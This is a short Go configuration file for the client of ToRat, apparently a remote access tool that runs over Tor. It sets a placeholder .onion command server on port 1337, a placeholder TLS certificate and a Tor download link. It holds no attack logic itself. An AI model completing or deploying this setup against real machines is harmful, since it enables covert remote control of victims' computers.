package client

import "github.com/lu4p/ToRat_client/crypto"

const (
	// serverDomain needs to be changed to your address
	serverDomain = "youronionadresshere.onion"
	serverPort   = ":1337"
	serverAddr   = serverDomain + serverPort
)

// serverCert needs to be changed to the TLS certificate of the server
// intendation breaks the certificate
const serverCert = `-----BEGIN CERTIFICATE-----
YOUR CERT HERE
-----END CERTIFICATE-----`

var (
	ServerPubKey, _ = crypto.CertToPubKey(serverCert)
	WinTorLink      = "https://www.torproject.org/dist/torbrowser/8.0.7/tor-win32-0.3.5.8.zip"
)
